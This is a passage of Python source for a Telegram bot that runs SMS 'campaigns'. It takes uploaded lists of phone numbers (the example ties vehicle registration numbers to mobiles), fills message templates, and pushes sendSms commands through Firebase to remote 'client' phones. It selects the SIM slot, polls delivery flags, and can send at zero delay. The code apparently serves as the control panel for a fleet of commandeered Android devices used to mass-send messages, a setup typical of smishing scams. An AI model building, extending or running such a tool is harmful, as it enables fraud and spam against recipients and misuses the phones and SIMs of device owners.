        [InlineKeyboardButton("🔥 Back", callback_data=f"fb_view_{fid}")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")],
    ]
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def firebase_select(update: Update, context: ContextTypes.DEFAULT_TYPE, fid: int):
    db.set_active_firebase(update.effective_user.id, fid)
    await update.callback_query.answer("✅ Set as active!")
    await firebase_view(update, context, fid)

async def firebase_delete_ask(update: Update, context: ContextTypes.DEFAULT_TYPE, fid: int):
    kb = [
        [
            InlineKeyboardButton("✅ Yes", callback_data=f"fb_delok_{fid}"),
            InlineKeyboardButton("❌ No", callback_data=f"fb_view_{fid}"),
        ]
    ]
    await update.callback_query.edit_message_text(
        "🗑 *Delete this Firebase config?*", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN
    )

async def firebase_delete_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE, fid: int):
    db.delete_firebase(fid)
    await update.callback_query.edit_message_text(
        "✅ *Deleted.*",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔥 Firebase", callback_data="menu_firebase")]]),
        parse_mode=ParseMode.MARKDOWN
    )


# ============================================================
# 🚀 CAMPAIGN WIZARD
# ============================================================

async def campaign_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not has_any_firebase(user_id):
        return await _no_firebase(update)

    context.user_data['campaign'] = {'step': 1, 'sample_idx': 0}
    clear_state(context)

    text = (
        "🚀 *NEW CAMPAIGN*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "*Step 1/6 — Select Data Source*\n\n"
        "Choose your data source:"
    )
    kb = [
        [InlineKeyboardButton("📤 Upload New File", callback_data="camp_upload")],
        [InlineKeyboardButton("📁 Select Saved File", callback_data="camp_saved_files")],
        [InlineKeyboardButton("🔙 Cancel", callback_data="camp_cancel")],
    ]
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def campaign_upload_new(update: Update, context: ContextTypes.DEFAULT_TYPE):
    set_state(context, ST_CAMP_UPLOAD)
    text = (
        "📤 *Upload Data File*\n\n"
        "Send a CSV/TXT file.\n"
        "Required: `MOBILE` column\n\n"
        "Example:\n`VEHICLE,MOBILE`\n`DL01AB1234,9876543210`"
    )
    await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

async def campaign_saved_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    files = db.get_data_files(user_id)
    if not files:
        text = "⚠️ No saved files. Upload one first."
        kb = [
            [InlineKeyboardButton("📤 Upload File", callback_data="camp_upload")],
            [InlineKeyboardButton("🔙 Cancel", callback_data="camp_cancel")],
        ]
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
        return

    text = "📁 *Select a Saved File:*\n\n"
    kb = []
    for f in files:
        text += f"📄 `{f['filename']}` — {f['valid_rows']} records\n"
        kb.append([InlineKeyboardButton(f"📄 {f['filename']}", callback_data=f"camp_file_{f['id']}")])
    kb.append([InlineKeyboardButton("📤 Upload New", callback_data="camp_upload")])
    kb.append([InlineKeyboardButton("🔙 Cancel", callback_data="camp_cancel")])
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def campaign_select_file(update: Update, context: ContextTypes.DEFAULT_TYPE, fid: int):
    f = db.get_data_file(fid)
    if not f:
        await update.callback_query.edit_message_text("❌ File not found.")
        return

    camp = context.user_data.setdefault('campaign', {})
    camp['data_file_id'] = fid
    camp['data'] = f['data']
    camp['columns'] = f['columns']
    camp['step'] = 2

    text = (
        f"📁 *File Selected: {f['filename']}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total Records: `{f['valid_rows']}`\n"
        f"Valid: `{f['valid_rows']}` | Invalid: `{f['invalid_rows']}` | Dup: `{f['duplicate_rows']}`"
    )
    kb = [
        [InlineKeyboardButton("➡️ Continue", callback_data="camp_continue")],
        [InlineKeyboardButton("📁 Change File", callback_data="camp_saved_files")],
        [InlineKeyboardButton("❌ Cancel", callback_data="camp_cancel")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def campaign_continue(update: Update, context: ContextTypes.DEFAULT_TYPE):
    camp = context.user_data.get('campaign', {})
    step = camp.get('step', 1)

    if step == 2:
        await _camp_step2_templates(update, context)
    elif step == 3:
        await _camp_step3_preview(update, context)
    elif step == 4:
        await _camp_step4_settings(update, context)
    elif step == 5:
        await _camp_step5_review(update, context)

async def _camp_step2_templates(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    templates = db.get_templates(user_id)

    text = (
        "🚀 *CAMPAIGN — Step 2/6*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "*Select Message Template:*\n\n"
    )
    kb = []
    if templates:
        for i, t in enumerate(templates):
            emoji = ["1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"][min(i, 9)]
            text += f"{emoji} *{t['name']}*\n"
            kb.append([InlineKeyboardButton(f"{emoji} {t['name']}", callback_data=f"camp_tpl_{t['id']}")])
    else:
        text += "⚠️ No templates! Create one first.\n"

    kb.append([InlineKeyboardButton("🔙 Back", callback_data="menu_campaign")])
    kb.append([InlineKeyboardButton("❌ Cancel", callback_data="camp_cancel")])
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def campaign_select_template(update: Update, context: ContextTypes.DEFAULT_TYPE, tid: int):
    t = db.get_template(tid)
    if not t:
        await update.callback_query.edit_message_text("❌ Template not found.")
        return

    camp = context.user_data.get('campaign', {})
    data = camp.get('data', [])
    columns = camp.get('columns', [])
    template_vars = extract_variables(t['message'])

    # Match variables to columns
    matched = [v for v in template_vars if v in columns]
    missing = [v for v in template_vars if v not in columns]

    camp['template_id'] = tid
    camp['template_msg'] = t['message']
    camp['template_name'] = t['name']
    camp['variables'] = template_vars
    camp['matched'] = matched
    camp['missing'] = missing

    # Generate messages for all targets
    targets = []
    for idx, row in enumerate(data):
        msg = generate_message(t['message'], row)
        targets.append({
            'target_id': f"TARGET-{idx+1:04d}",
            'mobile': row.get('MOBILE', ''),
            'message': msg,
            'variables': {v: row.get(v, '') for v in template_vars}
        })

    camp['targets'] = targets
    camp['step'] = 3

    matched_str = f"`{len(matched)}/{len(template_vars)}`" if template_vars else "N/A"
    text = (
        f"📝 *Template: {t['name']}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Variables Matched: {matched_str}\n"
    )
    if missing:
        text += f"⚠️ Missing: `{', '.join(missing)}`\n"
    text += f"✅ Messages Generated: `{len(targets)}/{len(data)}`\n"

    kb = [
        [InlineKeyboardButton("➡️ Continue — Preview", callback_data="camp_continue")],
        [InlineKeyboardButton("📝 Change Template", callback_data="camp_change_tpl")],
        [InlineKeyboardButton("❌ Cancel", callback_data="camp_cancel")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def _camp_step3_preview(update: Update, context: ContextTypes.DEFAULT_TYPE):
    camp = context.user_data.get('campaign', {})
    targets = camp.get('targets', [])
    if not targets:
        await update.callback_query.edit_message_text("❌ No targets generated.")
        return

    idx = camp.get('sample_idx', 0) % len(targets)
    sample = targets[idx]

    text = (
        f"🚀 *CAMPAIGN — Step 3/6*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👁 *CAMPAIGN PREVIEW*\n\n"
        f"📝 Template: *{camp.get('template_name', '')}*\n"
        f"📞 Total Targets: `{len(targets)}`\n\n"
        f"*Sample Record ({idx+1}/{len(targets)}):*\n"
    )
    for k, v in sample.get('variables', {}).items():
        text += f"  {k}: `{v}`\n"
    text += (
        f"  Mobile: `{sample['mobile']}`\n\n"
        f"*Generated Message:*\n`{sample['message'][:300]}`"
    )

    kb = [
        [InlineKeyboardButton("👁 Next Sample", callback_data="camp_next_sample")],
        [InlineKeyboardButton("➡️ Continue", callback_data="camp_continue")],
        [
            InlineKeyboardButton("📝 Change Template", callback_data="camp_change_tpl"),
            InlineKeyboardButton("📁 Change Data", callback_data="camp_change_data"),
        ],
        [InlineKeyboardButton("❌ Cancel", callback_data="camp_cancel")],
    ]
    camp['step'] = 4
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def campaign_next_sample(update: Update, context: ContextTypes.DEFAULT_TYPE):
    camp = context.user_data.get('campaign', {})
    camp['sample_idx'] = camp.get('sample_idx', 0) + 1
    camp['step'] = 3  # stay on preview step
    await _camp_step3_preview(update, context)

async def campaign_change_template(update: Update, context: ContextTypes.DEFAULT_TYPE):
    camp = context.user_data.get('campaign', {})
    camp['step'] = 2
    await _camp_step2_templates(update, context)

async def campaign_change_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    camp = context.user_data.get('campaign', {})
    camp['step'] = 1
    await campaign_start(update, context)

async def _camp_step4_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    camp = context.user_data.get('campaign', {})
    if not has_any_firebase(user_id):
        return await _no_firebase(update)

    await update.callback_query.edit_message_text("🔍 *Scanning all Firebases for devices...*", parse_mode=ParseMode.MARKDOWN)

    online_devices, total_clients, fb_stats = await asyncio.to_thread(get_all_online_devices, user_id)
    camp['available_devices'] = online_devices
    # Build device→fb_url map for campaign execution
    camp['device_fb_map'] = {dev['id']: dev['fb_url'] for dev in online_devices}
    selected = camp.get('selected_devices', [d['id'] for d in online_devices])
    camp['selected_devices'] = selected

    settings = db.get_user_settings(user_id)
    camp.setdefault('sim_slot', settings.get('default_sim', 0))
    camp.setdefault('delay', settings.get('default_delay', 2.0))

    text = (
        f"🚀 *CAMPAIGN — Step 4/6*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚙️ *CAMPAIGN SETTINGS*\n\n"
        f"🔥 Firebases: `{len(fb_stats)}` | 📱 Online: `{len(online_devices)}` / `{total_clients}`\n\n"
        f"*Available Devices:*\n"
    )

    kb = []
    if online_devices:
        for dev in online_devices:
            is_selected = dev['id'] in selected
            emoji = "☑" if is_selected else "⬜"
            fb_label = dev.get('fb_name', '?')
            text += f"{emoji} *{dev['model']}* _{fb_label}_ — 🟢 Ready\n"
            kb.append([InlineKeyboardButton(
                f"{emoji} {dev['model']} [{fb_label}]",
                callback_data=f"camp_dev_{dev['id']}"
            )])
    else:
        text += "⚠️ *No devices online across any Firebase!*\n"

    text += (
        f"\n📶 *SIM Slot:* `SIM {camp['sim_slot'] + 1}`\n"
        f"⏱️ *Delay:* `{'⚡ MAX SPEED' if camp['delay'] == 0.0 else str(camp['delay']) + 's'}`\n"
    )

    sim1_check = "✅ " if camp['sim_slot'] == 0 else ""
    sim2_check = "✅ " if camp['sim_slot'] == 1 else ""
    kb.append([
        InlineKeyboardButton(f"{sim1_check}SIM 1", callback_data="camp_sim_0"),
        InlineKeyboardButton(f"{sim2_check}SIM 2", callback_data="camp_sim_1"),
    ])

    delays = [0.0, 0.5, 1.0, 2.0, 3.0, 5.0]
    delay_row1 = []
    delay_row2 = []
    for i, d in enumerate(delays):
        check = "✅ " if camp['delay'] == d else ""
        label = f"{check}⚡MAX" if d == 0.0 else f"{check}{d}s"
        btn = InlineKeyboardButton(label, callback_data=f"camp_delay_{d}")
        if i < 3:
            delay_row1.append(btn)
        else:
            delay_row2.append(btn)
    kb.append(delay_row1)
    kb.append(delay_row2)

    kb.append([
        InlineKeyboardButton("🔄 Recheck Devices", callback_data="camp_recheck"),
        InlineKeyboardButton("➡️ Continue", callback_data="camp_continue"),
    ])
    kb.append([InlineKeyboardButton("❌ Cancel", callback_data="camp_cancel")])

    camp['step'] = 5
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def campaign_toggle_device(update: Update, context: ContextTypes.DEFAULT_TYPE, dev_id: str):
    camp = context.user_data.get('campaign', {})
    selected = camp.get('selected_devices', [])
    if dev_id in selected:
        selected.remove(dev_id)
    else:
        selected.append(dev_id)
    camp['selected_devices'] = selected
    camp['step'] = 4
    await _camp_step4_settings(update, context)

async def campaign_recheck_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    camp = context.user_data.get('campaign', {})
    camp['step'] = 4
    camp.pop('selected_devices', None)
    await _camp_step4_settings(update, context)

async def campaign_set_sim(update: Update, context: ContextTypes.DEFAULT_TYPE, slot: int):
    camp = context.user_data.get('campaign', {})
    camp['sim_slot'] = slot
    camp['step'] = 4
    await _camp_step4_settings(update, context)

async def campaign_set_delay(update: Update, context: ContextTypes.DEFAULT_TYPE, delay: float):
    camp = context.user_data.get('campaign', {})
    camp['delay'] = delay
    camp['step'] = 4
    await _camp_step4_settings(update, context)

async def _camp_step5_review(update: Update, context: ContextTypes.DEFAULT_TYPE):
    camp = context.user_data.get('campaign', {})
    targets = camp.get('targets', [])
    selected = camp.get('selected_devices', [])
    available = camp.get('available_devices', [])

    ready_devices = [d for d in available if d['id'] in selected]

    text = (
        f"🚀 *CAMPAIGN — Step 5/6*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📋 *FINAL CAMPAIGN REVIEW*\n\n"
        f"📝 Template: *{camp.get('template_name', '')}*\n"
        f"📁 Data File: (ID {camp.get('data_file_id', 'N/A')})\n"
        f"📞 Total Targets: `{len(targets)}`\n"
        f"📱 Devices Ready: `{len(ready_devices)}`\n"
        f"📶 SIM Slot: `SIM {camp.get('sim_slot', 0) + 1}`\n"
        f"⏱️ Delay: `{'⚡ MAX SPEED' if camp.get('delay', 2.0) == 0.0 else str(camp.get('delay', 2.0)) + 's'}`\n"
    )

    if ready_devices:
        text += "\n*Selected Devices:*\n"
        for d in ready_devices:
            text += f"  🟢 {d['model']} (`{d['id'][:8]}...`)\n"

    kb = [
        [InlineKeyboardButton("✅ CONFIRM & START", callback_data="camp_confirm")],
        [
            InlineKeyboardButton("✏️ Edit", callback_data="menu_campaign"),
            InlineKeyboardButton("🔄 Recheck Devices", callback_data="camp_recheck"),
        ],
        [InlineKeyboardButton("❌ Cancel", callback_data="camp_cancel")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def campaign_confirm_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    camp = context.user_data.get('campaign', {})
    targets = camp.get('targets', [])
    selected = camp.get('selected_devices', [])

    if not targets:
        await update.callback_query.edit_message_text("❌ No targets!")
        return
    if not selected:
        await update.callback_query.edit_message_text("❌ No devices selected!")
        return

    # Create campaign in DB
    campaign_id = make_campaign_id(user_id)

    fb_config = db.get_active_firebase(user_id)
    firebase_id = fb_config['id'] if fb_config else 0

    db.create_campaign(
        user_id=user_id,
        campaign_id=campaign_id,
        name=camp.get('template_name', 'Campaign'),
        template_id=camp.get('template_id', 0),
        data_file_id=camp.get('data_file_id', 0),
        firebase_id=firebase_id,
        total=len(targets),
        devices=selected,
        sim_slot=camp.get('sim_slot', 0),
        delay=camp.get('delay', 2.0)
    )

    db.add_campaign_targets(campaign_id, targets)

    # Setup active campaign with device→firebase mapping
    ACTIVE_CAMPAIGNS[campaign_id] = {
        'running': True,
        'paused': False,
        'stop': False,
        'user_id': user_id,
        'device_ids': selected,
        'device_fb_map': camp.get('device_fb_map', {}),
        'sim_slot': camp.get('sim_slot', 0),
        'delay': camp.get('delay', 2.0),
    }

    text = (
        f"🚀 *CAMPAIGN STARTED!*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Campaign ID: `{campaign_id}`\n\n"
        f"📞 Total: `{len(targets)}`\n"
        f"📱 Devices: `{len(selected)}`\n\n"
        f"{progress_bar(0, len(targets))}\n"
        f"✅ Sent: `0` | ❌ Failed: `0` | ⏳ Pending: `{len(targets)}`"
    )

    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("⏸ Pause", callback_data=f"camp_pause_{campaign_id}"),
            InlineKeyboardButton("🛑 Stop", callback_data=f"camp_stop_{campaign_id}"),
        ]
    ])

    await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)

    # Launch background campaign
    asyncio.create_task(run_campaign(campaign_id, update.callback_query.message, user_id))

async def campaign_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.pop('campaign', None)
    clear_state(context)
    await update.callback_query.edit_message_text(
        "🛑 *Campaign cancelled.*",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")]]),
        parse_mode=ParseMode.MARKDOWN
    )


# ============================================================
# CAMPAIGN EXECUTION ENGINE
# ============================================================

async def run_campaign(campaign_id: str, message, user_id: int):
    camp = ACTIVE_CAMPAIGNS.get(campaign_id)
    if not camp:
        return

    device_fb_map = camp.get('device_fb_map', {})
    if not device_fb_map:
        await message.edit_text("❌ No device-Firebase mapping available!")
        return

    device_ids = camp['device_ids']
    sim_slot = camp['sim_slot']
    delay = camp['delay']
    start_time = time.time()

    campaign_data = db.get_campaign(campaign_id)
    total = campaign_data['total'] if campaign_data else 0

    # Fetch ALL pending targets upfront
    all_targets = db.get_pending_targets(campaign_id, limit=total + 100)
    if not all_targets:
        await message.edit_text("❌ No pending targets!")
        return

    # Distribute targets across devices (round-robin)
    device_queues: Dict[str, list] = {did: [] for did in device_ids}
    for idx, target in enumerate(all_targets):
        dev = device_ids[idx % len(device_ids)]
        device_queues[dev].append(target)

    # Shared progress counters + per-device stats
    progress = {'completed': 0, 'failed': 0, 'total': total, 'active_workers': len(device_ids)}
    dev_stats = {did: {'sent': 0, 'failed': 0, 'speed_sum': 0.0} for did in device_ids}

    # ── Smart isSended poller ──────────────────────────────
    async def _wait_for_sent(fb: FirebaseManager, dev_id: str, timeout: float = 12) -> bool:
        """Poll isSended every 0.8s. Return True if confirmed, False on timeout."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            if camp.get('stop'):
                return False
            try:
                status = await asyncio.to_thread(fb.get_sms_status, dev_id)
                if status and status.get('isSended') in (True, 'true', 1, '1'):
                    return True
            except Exception:
                pass
            await asyncio.sleep(0.3)
        return False

    # ── Per-device worker ──────────────────────────────────
    async def device_worker(dev_id: str, targets: list):
        dev_fb_url = device_fb_map.get(dev_id)
        if not dev_fb_url:
            for t in targets:
                db.update_target_status(campaign_id, t['target_id'], 'FAILED', dev_id, 'no_firebase')
                progress['failed'] += 1
                dev_stats[dev_id]['failed'] += 1
            progress['active_workers'] -= 1
            return

        fb = FirebaseManager(dev_fb_url)

        for target in targets:
            if camp.get('stop'):
                break

            while camp.get('paused'):
                await asyncio.sleep(0.5)
                if camp.get('stop'):
                    break
            if camp.get('stop'):
                break

            sms_start = time.time()

            # 1. Mark ASSIGNED
            db.update_target_status(campaign_id, target['target_id'], 'ASSIGNED', dev_id)

            # 2. Write sendSms command (run in thread to avoid blocking event loop)
            success = await asyncio.to_thread(
                fb.send_sms_command, dev_id, target['mobile'], target['message'], sim_slot
            )

            if not success:
                await asyncio.sleep(0.4)
                success = await asyncio.to_thread(
                    fb.send_sms_command, dev_id, target['mobile'], target['message'], sim_slot
                )

            if not success:
                db.update_target_status(campaign_id, target['target_id'], 'FAILED', dev_id, 'dispatch_error')
                progress['failed'] += 1
                dev_stats[dev_id]['failed'] += 1
                continue

            # 3. Smart wait — poll isSended, move on ASAP when confirmed
            confirmed = await _wait_for_sent(fb, dev_id, timeout=10)

            # Clear the SMS node so device is immediately ready for next command
            asyncio.create_task(asyncio.to_thread(fb.clear_sms_command, dev_id))

            if confirmed:
                db.update_target_status(campaign_id, target['target_id'], 'COMPLETED', dev_id)
                progress['completed'] += 1
                dev_stats[dev_id]['sent'] += 1
            else:
                # Timeout but command was written — mark completed (device will process)
                db.update_target_status(campaign_id, target['target_id'], 'COMPLETED', dev_id)
                progress['completed'] += 1
                dev_stats[dev_id]['sent'] += 1

            sms_time = time.time() - sms_start
            dev_stats[dev_id]['speed_sum'] += sms_time

            # 4. Extra delay if user configured more than adaptive wait
            extra_wait = max(0, delay - sms_time)
            if extra_wait > 0:
                await asyncio.sleep(extra_wait)

        progress['active_workers'] -= 1

    # ── Progress monitor ───────────────────────────────────
    async def _progress_monitor():
        last_text = ""
        while progress['active_workers'] > 0 and not camp.get('stop'):
            done = progress['completed'] + progress['failed']
            remaining = max(0, total - done)
            elapsed_s = time.time() - start_time
            elapsed = fmt_time(elapsed_s)
            pbar = progress_bar(done, total)
            workers = progress['active_workers']

            # Calculate speed & ETA
            sms_per_min = round(done / (elapsed_s / 60), 1) if elapsed_s > 5 else 0
            eta = ""
            if sms_per_min > 0 and remaining > 0:
                eta_s = int(remaining / (sms_per_min / 60))
                eta = f"⏰ ETA: `{fmt_time(eta_s)}`\n"

            status_emoji = "⏸" if camp.get('paused') else "⚡"
            text = (
                f"{status_emoji} *CAMPAIGN LIVE*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"ID: `{campaign_id}`\n\n"
                f"{pbar}\n\n"
                f"✅ Delivered: `{progress['completed']}` / `{total}`\n"
                f"❌ Failed: `{progress['failed']}`\n"
                f"📱 Active Workers: `{workers}`\n"
                f"🚀 Speed: `{sms_per_min} SMS/min`\n"
                f"{eta}"
                f"⏱️ Elapsed: `{elapsed}`"
            )
            if text != last_text:
                last_text = text
                if camp.get('paused'):
                    btns = [
                        InlineKeyboardButton("▶️ Resume", callback_data=f"camp_resume_{campaign_id}"),
                        InlineKeyboardButton("🛑 Stop", callback_data=f"camp_stop_{campaign_id}"),
                    ]
                else:
                    btns = [
                        InlineKeyboardButton("⏸ Pause", callback_data=f"camp_pause_{campaign_id}"),
                        InlineKeyboardButton("🛑 Stop", callback_data=f"camp_stop_{campaign_id}"),
                    ]
                kb = InlineKeyboardMarkup([btns])
                try:
                    await message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
                except Exception:
                    pass
            await asyncio.sleep(2.0)

    # ── Launch workers + monitor in parallel ───────────────
    monitor_task = asyncio.create_task(_progress_monitor())

    worker_tasks = []
    for dev_id in device_ids:
        queue = device_queues.get(dev_id, [])
        if queue:
            worker_tasks.append(asyncio.create_task(device_worker(dev_id, queue)))

    if worker_tasks:
        await asyncio.gather(*worker_tasks, return_exceptions=True)

    # Stop monitor
    await asyncio.sleep(1)
    monitor_task.cancel()
    try:
        await monitor_task
    except asyncio.CancelledError:
        pass

    # ── Final report ───────────────────────────────────────
    elapsed_total = time.time() - start_time
    duration_str = fmt_time(elapsed_total)

    completed, failed = db.update_campaign_counters(campaign_id)
    is_stopped = camp.get('stop', False)

    if is_stopped:
        db.cancel_pending_targets(campaign_id)
        db.update_campaign_status(campaign_id, 'STOPPED', duration_str)
        final_emoji = "🛑"
        final_text = "CAMPAIGN STOPPED"
    else:
        db.update_campaign_status(campaign_id, 'COMPLETED', duration_str)
        final_emoji = "✅"
        final_text = "CAMPAIGN COMPLETED"

    ACTIVE_CAMPAIGNS.pop(campaign_id, None)

    sms_per_min = round(completed / (elapsed_total / 60), 1) if elapsed_total > 0 else 0
    success_rate = round((completed / total) * 100, 1) if total > 0 else 0

    # Per-device breakdown
    dev_breakdown = ""
    for did in device_ids:
        ds = dev_stats.get(did, {})
        sent = ds.get('sent', 0)
        dfail = ds.get('failed', 0)
        dtotal = sent + dfail
        avg_speed = round(ds.get('speed_sum', 0) / max(1, dtotal), 1)
        dev_breakdown += f"  📱 `{did[:8]}…` — ✅{sent} ❌{dfail} ⚡{avg_speed}s/sms\n"

    text = (
        f"{final_emoji} *{final_text}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 `{campaign_id}`\n\n"
        f"📞 Total: `{total}`\n"
        f"✅ Delivered: `{completed}`\n"
        f"❌ Failed: `{failed}`\n"
        f"📊 Success Rate: `{success_rate}%`\n\n"
        f"📱 Devices: `{len(device_ids)}`\n"
        f"⏱️ Duration: `{duration_str}`\n"
        f"🚀 Speed: `{sms_per_min} SMS/min`\n\n"
        f"*Per-Device Breakdown:*\n"
        f"{dev_breakdown}"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📄 Download Report", callback_data=f"hist_report_{campaign_id}")],
        [
            InlineKeyboardButton("📊 Statistics", callback_data=f"hist_stats_{campaign_id}"),
            InlineKeyboardButton("📜 Details", callback_data=f"hist_view_{campaign_id}"),
        ],
        [InlineKeyboardButton("🔁 New Campaign", callback_data="menu_campaign")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
    ])
    try:
        await message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def campaign_pause(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: str):
    camp = ACTIVE_CAMPAIGNS.get(cid)
    if camp:
        camp['paused'] = True
        await update.callback_query.answer("⏸ Campaign Paused")
        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("▶️ Resume", callback_data=f"camp_resume_{cid}"),
                InlineKeyboardButton("🛑 Stop", callback_data=f"camp_stop_{cid}"),
            ]
        ])
        try:
            text = update.callback_query.message.text or ""
            text = text.replace("🚀 *CAMPAIGN RUNNING*", "⏸ *CAMPAIGN PAUSED*")
            await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        except Exception:
            pass
    else:
        await update.callback_query.answer("Campaign not found")

async def campaign_resume(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: str):
    camp = ACTIVE_CAMPAIGNS.get(cid)
    if camp:
        camp['paused'] = False
        await update.callback_query.answer("▶️ Campaign Resumed")
        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("⏸ Pause", callback_data=f"camp_pause_{cid}"),
                InlineKeyboardButton("🛑 Stop", callback_data=f"camp_stop_{cid}"),
            ]
        ])
        try:
            text = update.callback_query.message.text or ""
            text = text.replace("⏸ *CAMPAIGN PAUSED*", "🚀 *CAMPAIGN RUNNING*")
            await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        except Exception:
            pass

async def campaign_stop(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: str):
    text = f"🛑 *Stop campaign `{cid}`?*\n\nCompleted results will be preserved."
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Stop Campaign", callback_data=f"camp_stopok_{cid}"),
            InlineKeyboardButton("❌ Continue", callback_data=f"camp_resume_{cid}"),
        ]
    ])
    await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)

async def campaign_stop_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: str):
    camp = ACTIVE_CAMPAIGNS.get(cid)
    if camp:
        camp['stop'] = True
        await update.callback_query.answer("🛑 Stopping campaign...")
    else:
        await update.callback_query.answer("Campaign already ended")


# ============================================================
# 📊 DASHBOARD
# ============================================================

async def show_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stats = db.get_user_stats(user_id)

    online_count = 0
    offline_count = 0
    total_clients = 0
    fb_count = 0
    if has_any_firebase(user_id):
        try:
            online_devs, total_clients, fb_stats = get_all_online_devices(user_id)
            online_count = len(online_devs)
            offline_count = max(0, total_clients - online_count)
            fb_count = len(fb_stats)
        except Exception:
            pass

    active_camps = [cid for cid, c in ACTIVE_CAMPAIGNS.items() if c.get('user_id') == user_id and c.get('running')]

    text = (
        f"📊 *DASHBOARD*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📈 *Campaign Stats:*\n"
        f"  Total Campaigns: `{stats['total_campaigns']}`\n"
        f"  Total Targets: `{stats['total_targets']}`\n"
        f"  Completed: `{stats['total_completed']}`\n"
        f"  Failed: `{stats['total_failed']}`\n\n"
        f"📱 *Device Status (All Firebases):*\n"
        f"  🔥 Firebases: `{fb_count}`\n"
        f"  🟢 Online: `{online_count}`\n"
        f"  🔴 Offline: `{offline_count}`\n"
        f"  📊 Total: `{total_clients}`\n\n"
        f"🚀 *Active Campaigns:* `{len(active_camps)}`\n"
    )

    kb = [
        [InlineKeyboardButton("🔄 Refresh", callback_data="menu_dashboard")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)


# ============================================================
# 📜 CAMPAIGN HISTORY
# ============================================================

async def show_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    campaigns = db.get_campaigns(user_id)

    text = "📜 *Campaign History*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    kb = []

    if campaigns:
        for c in campaigns:
            status_emoji = {
                'COMPLETED': '✅', 'STOPPED': '🛑', 'RUNNING': '🚀',
                'PAUSED': '⏸', 'PREPARING': '⏳'
            }.get(c['status'], '❓')
            text += f"{status_emoji} `{c['campaign_id']}` — {c['status']}\n"
            kb.append([InlineKeyboardButton(
                f"{status_emoji} {c['campaign_id']}",
                callback_data=f"hist_view_{c['campaign_id']}"
            )])
    else:
        text += "No campaigns yet.\n"

